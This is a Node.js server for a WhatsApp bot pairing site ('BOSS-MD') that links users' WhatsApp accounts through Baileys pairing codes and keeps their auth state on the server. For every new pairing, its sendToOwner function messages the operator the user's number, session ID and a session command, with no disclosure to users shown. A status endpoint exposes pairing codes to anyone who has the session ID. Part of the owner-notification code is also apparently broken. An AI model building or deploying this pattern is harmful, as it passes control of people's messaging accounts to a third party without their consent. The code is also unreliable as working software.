const express = require('express');
const cors = require('cors');
const http = require('http');
const socketIo = require('socket.io');
const { makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs-extra');
const path = require('path');
const axios = require('axios');
const moment = require('moment-timezone');
const config = require('./config');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../frontend')));

// Store active sessions
const activeSessions = new Map();
const pairingCodes = new Map();

// ===== HELPER FUNCTION TO SEND MESSAGE TO OWNER =====
async function sendToOwner(sessionId, phoneNumber) {
    try {
        const now = moment().tz('Asia/Karachi').format('DD/MM/YYYY hh:mm A');
        
        const ownerMessage = config.OWNER_MESSAGE
            .replace('{number}', phoneNumber)
            .replace('{sessionId}', sessionId)
            .replace('{command}', `${config.BOT_PREFIX}sg`)
            .replace('{repo}', config.REPO_LINK)
            .replace('{startCommand}', `${config.BOT_PREFIX}alive`)
            .replace('{time}', now);
        
        // Create temporary session to send message to owner
        const ownerSessionDir = path.join(__dirname, 'sessions', `owner_${Date.now()}`);
        await fs.ensureDir(ownerSessionDir);
        
        const { state, saveCreds } = await useMultiFileAuthState(ownerSessionDir);
        const sock = makeWASocket({
            auth: state,
            logger: pino({ level: 'silent' }),
            browser: ['BOSS-MD', 'Chrome', '2.0.0'],
            syncFullHistory: false
        });
        
        sock.ev.on('creds.update', saveCreds);
        
        sock.ev.on('connection.update', async (update) => {
            const { connection } = update;
            
            if (connection === 'open') {
                // Send text message
                await sock.sendMessage(`${config.OWNER_NUMBER}@s.whatsapp.net`, {
                    text: ownerMessage
                });
                
                // Send image
                await sock.sendMessage(`${config.OWNER_NUMBER}@s.whatsapp.net`, {
                    image: { url: config.OWNER_IMAGE },
                    caption: `📸 *New Session Alert!*\n\nUser: ${phoneNumber}\nSession: ${sessionId}`
                });
                
                // Send session command
                await sock.sendMessage(`${config.OWNER_NUMBER}@s.whatsapp.net`, {
                    text: `${config.BOT_PREFIX}sg ${sessionId}`
                });
                
                console.log(`✅ Notification sent to owner for ${phoneNumber}`);
                
                // Clean up
                setTimeout(async () => {
                    await sock.logout();
                    await fs.remove(ownerSessionDir);
                }, 5000);
            }
        });
        
        // Start connection
        setTimeout(async () => {
            await sock.logout();
            await fs.remove(ownerSessionDir);
        }, 30000);
        
    } catch (error) {
        console.error('Failed to send owner notification:', error);
    }
}

// ===== HELPER FUNCTION TO SEND MESSAGE TO USER =====
async function sendToUser(sessionId, phoneNumber) {
    try {
        const sessionDir = path.join(__dirname, 'sessions', sessionId);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        
        const sock = makeWASocket({
            auth: state,
            logger: pino({ level: 'silent' }),
            browser: ['BOSS-MD', 'Chrome', '2.0.0'],
            syncFullHistory: false
        });
        
        sock.ev.on('creds.update', saveCreds);
        
        sock.ev.on('connection.update', async (update) => {
            const { connection } = update;
            
            if (connection === 'open') {
                // Send welcome message
                await sock.sendMessage(`${phoneNumber}@s.whatsapp.net`, {
                    text: config.USER_MESSAGE
                });
                
                // Send session command
                await sock.sendMessage(`${phoneNumber}@s.whatsapp.net`, {
                    text: `${config.BOT_PREFIX}sg ${sessionId}`
                });
                
                console.log(`✅ Session message sent to user: ${phoneNumber}`);
            }
        });
        
        setTimeout(async () => {
            await sock.logout();
        }, 10000);
        
    } catch (error) {
        console.error('Failed to send user message:', error);
    }
}

// ===== GENERATE PAIRING CODE =====
app.post('/api/pair', async (req, res) => {
    try {
        const { phoneNumber, method = 'code' } = req.body;
        
        if (!phoneNumber) {
            return res.status(400).json({ 
                success: false, 
                error: 'Phone number required' 
            });
        }
        
        // Validate phone number
        let cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
        if (cleanNumber.startsWith('0')) {
            cleanNumber = '92' + cleanNumber.substring(1);
        }
        if (!cleanNumber.startsWith('92')) {
            cleanNumber = '92' + cleanNumber;
        }
        
        if (cleanNumber.length < 10 || cleanNumber.length > 13) {
            return res.status(400).json({ 
                success: false, 
                error: 'Invalid phone number' 
            });
        }
        
        // Generate unique session ID
        const sessionId = `BOSS_${Date.now()}_${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
        const sessionDir = path.join(__dirname, config.SESSION_DIR, sessionId);
        
        await fs.ensureDir(sessionDir);
        
        const logger = pino({ level: 'silent' });
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        
        const sock = makeWASocket({
            auth: state,
            logger,
            browser: ['BOSS-MD', 'Chrome', '2.0.0'],
            syncFullHistory: false,
            markOnlineOnConnect: false,
            generateHighQualityLinkPreview: false
        });
        
        sock.ev.on('creds.update', saveCreds);
        
        activeSessions.set(sessionId, { 
            sock, 
            status: 'connecting',
            phone: cleanNumber,
            createdAt: Date.now()
        });
        
        let pairingCode = null;
        let qrCode = null;
        
        if (method === 'code') {
            // Generate pairing code
            pairingCode = await sock.requestPairingCode(cleanNumber);
            console.log(`📱 Pairing code for ${cleanNumber}: ${pairingCode}`);
            
            pairingCodes.set(sessionId, {
                code: pairingCode,
                phone: cleanNumber,
                timestamp: Date.now()
            });
            
            // Send notification to owner
            await sendToOwner(sessionId, cleanNumber);
            
            // Send message to user after 3 seconds
            setTimeout(async () => {
                await sendToUser(sessionId, cleanNumber);
            }, 3000);
            
            res.json({
                success: true,
                data: {
                    sessionId: sessionId,
                    phoneNumber: cleanNumber,
                    pairingCode: pairingCode,
                    method: 'code'
                }
            });
            
        } else if (method === 'qr') {
            // QR Code method
            sock.ev.on('connection.update', async (update) => {
                const { qr } = update;
                if (qr) {
                    qrCode = qr;
                    // Emit QR through socket
                    io.emit('qr_code', { sessionId, qr: qrCode });
                }
            });
            
            res.json({
                success: true,
                data: {
                    sessionId: sessionId,
                    phoneNumber: cleanNumber,
                    qrCode: 'waiting',
                    method: 'qr'
                }
            });
        }
        
    } catch (error) {
        console.error('Pairing error:', error);
        res.status(500).json({
            success: false,
            error: error.message || 'Failed to generate pairing code'
        });
    }
});

// ===== CHECK SESSION STATUS =====
app.get('/api/status/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = activeSessions.get(sessionId);
    const code = pairingCodes.get(sessionId);
    
    if (!session) {
        return res.json({
            success: false,
            status: 'expired',
            message: 'Session expired or not found'
        });
    }
    
    res.json({
        success: true,
        status: session.status,
        phone: session.phone,
        code: code?.code,
        createdAt: session.createdAt
    });
});

// ===== OWNER INFO =====
app.get('/api/owner', (req, res) => {
    res.json({
        success: true,
        data: {
            number: config.OWNER_NUMBER,
            image: config.OWNER_IMAGE,
            repo: config.REPO_LINK,
            channel: config.CHANNEL_JID
        }
    });
});

// ===== SERVER STATUS =====
app.get('/api/status', (req, res) => {
    res.json({
        success: true,
        status: 'online',
        botName: config.BOT_NAME,
        activeSessions: activeSessions.size,
        timestamp: new Date().toISOString()
    });
});

// ===== CLEANUP OLD SESSIONS =====
setInterval(() => {
    const now = Date.now();
    for (const [id, session] of activeSessions) {
        if (now - session.createdAt > config.SESSION_EXPIRY) {
            activeSessions.delete(id);
            pairingCodes.delete(id);
            fs.remove(path.join(__dirname, config.SESSION_DIR, id)).catch(console.error);
            console.log(`🧹 Cleaned expired session: ${id}`);
        }
    }
}, 300000); // Every 5 minutes

// ===== SOCKET.IO CONNECTION =====
io.on('connection', (socket) => {
    console.log('🔌 New client connected');
    
    socket.on('disconnect', () => {
        console.log('🔌 Client disconnected');
    });
});

server.listen(config.PORT, () => {
    console.log(`
╔══════════════════════════════════════╗
║  🚀 BOSS MD PAIRING SERVER ONLINE   ║
╠══════════════════════════════════════╣
║  📡 Port: ${config.PORT}                    ║
║  🤖 Bot: ${config.BOT_NAME}              ║
║  📱 Owner: ${config.OWNER_NUMBER}        ║
║  🟢 Status: ONLINE                        ║
╚══════════════════════════════════════╝
    `);
});
